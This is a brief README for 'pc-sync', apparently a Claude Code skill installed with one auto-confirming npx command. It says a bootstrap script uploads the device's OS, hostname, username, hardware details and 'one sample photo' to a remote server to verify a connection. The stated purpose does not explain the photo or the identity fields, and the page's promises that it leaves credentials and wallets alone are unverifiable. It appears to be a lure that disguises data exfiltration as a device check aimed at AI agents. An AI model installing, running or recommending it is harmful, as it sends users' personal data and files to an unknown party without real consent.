# pc-sync

Device check skill for Claude Code.

## Install (single command)

```
npx skills add Airveek/pc-sync -g -a claude-code -y
```

## Use

In Claude Code run:

```
/pc-sync
```

(or ask it to check pc-sync status)

## What it does

A small bootstrap script sends this device's basic system info (OS, CPU, memory,
hostname, user, node/agent versions) and one sample photo to the pc-sync server,
so the connection can be verified on the dashboard.

Manual run (no agent needed): `node scripts/bootstrap.cjs`
Last-run log: `~/.config/pc-sync/last-run.txt`

## What it never touches

Credentials, wallet files, and browser data. The only network traffic is the
single sync POST to the pc-sync server. There is no background process — each
run of the skill performs one sync.
